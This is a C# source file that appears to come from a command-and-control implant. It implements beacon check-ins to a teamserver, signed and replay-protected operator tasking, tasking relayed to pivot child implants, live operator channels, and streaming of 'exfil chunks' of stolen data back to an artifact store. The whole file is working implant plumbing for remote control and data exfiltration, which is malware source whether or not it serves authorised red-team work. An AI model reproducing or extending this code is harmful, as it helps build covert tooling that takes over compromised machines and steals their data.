using System.Collections.Concurrent;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The frame shapes and the cycle vocabulary every check-in client shares.
// Always compiled (the Chunking pattern): the transport modules that call it
// trim independently per bake, so the shared plumbing lives outside their
// files.

/// <summary>
/// What one connect-handshake-task cycle produced, driving the reconnect
/// policy every client's run loop applies.
/// </summary>
internal enum BeaconCycleResult
{
    /// <summary>The cycle never reached a handshake (a transport drop); retry.</summary>
    Dropped,

    /// <summary>The handshake succeeded and the session ran; reset the failure counter.</summary>
    Handshaken,

    /// <summary>The server refused the handshake permanently; the caller terminates.</summary>
    Terminal,
}

/// <summary>
/// The frame constructors and input router shared by the check-in clients:
/// one definition of the wire shapes, whichever transport carries them.
/// </summary>
internal static class BeaconFrames
{
    /// <summary>
    /// The handshake every check-in opens with: this implant's id, the
    /// negotiated protocol version, and the advertised capability set -- the
    /// baked class verbs intersected with the compiled handlers
    /// (architecture.md Sec 5.3), so the teamserver only ever dispatches verbs
    /// this binary can run. Both arms are advertised: the replay-nonce arm
    /// (Sec 9) stamps every dispatched task with a monotonic nonce covered by
    /// the signature once echoed, and the receive-ack arm (Sec 10.3) acks every
    /// parsed task before it executes so a dying stream's dispatches
    /// redeliver. A server that does not echo either keeps today's shape.
    /// </summary>
    public static HandshakeRequest Handshake(string implantId, IEnumerable<string> advertised)
    {
        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = implantId,
            ReplayNonces = true,
            TaskAcks = true,
        };
        handshake.Capabilities.Add(advertised);
        return handshake;
    }

    public static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
        => ResultFrame(task.TaskId, outcome, output);

    public static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskResult
            {
                TaskId = taskId,
                Outcome = outcome,
                Output = output,
            }.ToByteArray()),
            Kind = FrameKind.TaskResult,
        };

    /// <summary>
    /// The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
    /// one parsed task, sent before anything executes.
    /// </summary>
    public static Frame AckFrame(string taskId)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
            Kind = FrameKind.TaskAck,
        };

    /// <summary>
    /// One ChannelInput frame: operator input for a live channel, routed by
    /// task id. Input for a task with no live channel is dropped and logged --
    /// a channel that already ended, or input that raced the transport.
    /// </summary>
    public static void RouteChannelInput(
        Frame frame,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        TextWriter log)
    {
        ChannelInput input;
        try
        {
            input = ChannelInput.Parser.ParseFrom(frame.Payload);
        }
        catch (InvalidProtocolBufferException)
        {
            return;
        }

        if (liveChannels.TryGetValue(input.TaskId, out var channel))
        {
            if (!channel.Receive(input.Data.ToArray(), input.Eof))
                log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
        }
        else
        {
            log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
        }
    }
}

/// <summary>
/// Everything one parsed downstream TaskRequest goes through on a live stream
/// -- fronting (Sec 5.2), signature and nonce verification (Sec 9), the
/// dispatch strand's dedup and caching (Sec 10.3), the staged and channel
/// shapes -- shared by the stream clients (gRPC, WebSocket, QUIC), whose
/// bodies were line-for-line copies. The transports differ only in how a
/// frame leaves (the write delegate), how a staged transfer's chunks come
/// back (the staged delegate), and how a channel's handler is started; the
/// envelope POST client keeps its own acceptance because its batch-and-defer
/// semantics differ at each of those points.
/// </summary>
internal sealed class BeaconTasking(
    string implantId,
    IReadOnlyList<X509Certificate2> cas,
    FrontedPivots? frontedPivots,
    TaskNonceTracker nonces,
    HeldTaskLedger held,
    HandlerRegistry handlers,
    TextWriter log,
    bool markResultsOnWrite = true)
{
    /// <summary>
    /// Results whose delivery died with an earlier stream ride this one first
    /// (architecture.md Sec 10.3 -- the dispatch strand): the server records
    /// first-wins, so a re-send of a result the original stream already landed
    /// is absorbed, and one it lost is recovered.
    /// </summary>
    public async Task ReplayUndeliveredAsync(
        Func<Frame, CancellationToken, Task> write, CancellationToken cancellationToken)
    {
        foreach (var remembered in held.Undelivered())
        {
            await write(
                BeaconFrames.ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
                cancellationToken);
            held.MarkDelivered(remembered.TaskId);
        }
    }

    /// <summary>
    /// Writes one task result and caches it in the held-task ledger: the cache
    /// is what a redelivery re-sends, and the delivery mark is what a dying
    /// stream clears so the next connection re-sends it (first-wins
    /// server-side). A wire-writing carrier marks on the write (the frame left
    /// for the server to read); a batch carrier -- whose write queues the
    /// frame for a later cycle -- leaves the mark to its own "batch crossed"
    /// moment, so a failed cycle followed by a walk switch still replays the
    /// result on the next client.
    /// </summary>
    public async Task ReportAsync(
        string taskId,
        TaskOutcome outcome,
        string output,
        Func<Frame, CancellationToken, Task> write,
        CancellationToken cancellationToken)
    {
        await write(BeaconFrames.ResultFrame(taskId, outcome, output), cancellationToken);
        held.Remember(taskId, outcome, output);
        if (markResultsOnWrite)
            held.MarkDelivered(taskId);
    }

    /// <summary>
    /// One dispatched TaskRequest: the fronted gate, then verification, then
    /// the dispatch strand's dedup, then the staged / channel / inline shapes.
    /// A refused task is held and reported like any other -- its redelivery is
    /// answered from the cache, never re-executed. The channel shape is the
    /// caller's carriage: a live stream starts the channel on itself, a poll
    /// run starts it on its store-and-forward batch (PollChannels) -- the
    /// acceptance is the same either way.
    /// </summary>
    public async Task AcceptAsync(
        TaskRequest task,
        Func<Frame, CancellationToken, Task> write,
        Func<TaskRequest, CancellationToken, Task<(TaskOutcome Outcome, string Output)>> runStaged,
        Action<TaskRequest, CapabilityChannelHandler> startChannel,
        CancellationToken cancellationToken)
    {
        // Fronted tasking (architecture.md Sec 5.2): a frame marked with
        // another implant's id is a Pivot child's tasking this stream executes
        // on the child's behalf -- the child has no process to check in with.
        // The gate is the fronted ledger: only a child this implant enrolled
        // is frontable, so tasking for any other implant is refused on the
        // task even when the signature verifies (the signature binds the
        // tuple to the target id, Sec 9; it does not say this implant fronts
        // the target).
        var targetId = implantId;
        var fronted = false;
        if (task.HasTargetImplantId && task.TargetImplantId.Length > 0 && task.TargetImplantId != implantId)
        {
            targetId = task.TargetImplantId;
            fronted = true;
            if (frontedPivots is null || !frontedPivots.Knows(targetId))
            {
                log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
                await ReportAsync(
                    task.TaskId, TaskOutcome.Failed,
                    $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed",
                    write, cancellationToken);
                return;
            }
        }

        // Command signing (architecture.md Sec 9): verify the teamserver's
        // signature before any handler runs, and -- once the replay-nonce arm
        // is live -- that the task's nonce advances the accepted floor. A task
        // that fails either is reported Failed with the cause -- the operator
        // sees the rejection on the task itself, so a replayed frame surfaces
        // as a refused task -- and nothing executes. The signed tuple's
        // implant id is the target's own: this implant's for own tasking, the
        // fronted child's for fronted tasking. The nonce arm follows the
        // target too -- a pivot child never handshakes, so its tasking keeps
        // the nonce-less shape and a fresh tracker keeps this implant's
        // negotiated floor from refusing it.
        TaskOutcome outcome;
        string output;
        IReadOnlyList<ExfilChunk> chunks;
        var verdict = TaskingVerifier.Verify(
            targetId, task, cas, fronted ? new TaskNonceTracker() : nonces);
        if (verdict != TaskingVerdict.Accepted)
        {
            var cause = verdict switch
            {
                TaskingVerdict.RejectedReplay =>
                    $"task rejected: replayed tasking (nonce {task.TaskNonce} at or below the accepted floor); not executed",
                TaskingVerdict.RejectedNoNonce =>
                    "task rejected: no task nonce after the replay-nonce handshake; not executed",
                _ => "task rejected: signature verification failed; not executed",
            };
            log.WriteLine($"task {task.TaskId} rejected: {verdict}");
            outcome = TaskOutcome.Failed;
            output = cause;
            chunks = Array.Empty<ExfilChunk>();
        }
        else if (held.Contains(task.TaskId))
        {
            // The dispatch strand's dedup half (architecture.md Sec 10.3),
            // deliberately AFTER verification: the replay defense stays ahead
            // of the ledger, so a verbatim replay of a held task still falls
            // at the nonce floor (or the signature) and is refused on the
            // task. A redelivery that cleared verification re-sends the cached
            // result unconditionally -- a redelivery implies the server holds
            // no recorded result (its first-wins dropped or never saw the
            // original), and the duplicate a completed server would see is a
            // no-op there. Nothing re-executes.
            if (held.TryGetResult(task.TaskId, out var heldOutcome, out var heldOutput))
            {
                await ReportAsync(task.TaskId, heldOutcome, heldOutput, write, cancellationToken);
                log.WriteLine($"task {task.TaskId} redelivered; answered from the ledger without re-running");
            }
            else
            {
                // Held but unfinished (a channel that died with its stream, a
                // task still running): nothing to re-send and nothing to
                // re-run.
                log.WriteLine($"task {task.TaskId} redelivered while still held; re-acked without re-running");
            }
            return;
        }
        else if (handlers.ChannelFor(task.Verb) is { } channelHandler)
        {
            // The streaming shape: the task opens a channel instead of
            // completing inline. The carriage is the caller's pick -- the
            // startChannel delegate a live stream binds to itself, a poll run
            // to its store-and-forward batch -- and the handler reports its
            // own final TaskResult; the loop keeps reading while it runs.
            held.Hold(task.TaskId);
            startChannel(task, channelHandler);
            return;
        }
        else if (task.HasStagedBytes)
        {
            (outcome, output) = await runStaged(task, cancellationToken);
            chunks = Array.Empty<ExfilChunk>();
        }
        else
        {
            (outcome, output, chunks) = handlers.Dispatch(task.Verb, task.Arguments);
        }

        // Held from here on whatever the outcome was -- a refused task is
        // parsed and answered too, and its redelivery is answered from the
        // cache the same way (the channel branch held above, before its early
        // return).
        held.Hold(task.TaskId);
        await ReportAsync(task.TaskId, outcome, output, write, cancellationToken);

        // Out-of-band exfil chunks follow the TaskResult on the same stream.
        // Each carries the task id so the server reassembles and routes them
        // to the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
        foreach (var chunk in chunks)
        {
            chunk.TaskId = task.TaskId;
            await write(new Frame
            {
                Payload = ByteString.CopyFrom(chunk.ToByteArray()),
                Kind = FrameKind.ExfilChunk,
            }, cancellationToken);
        }
    }
}
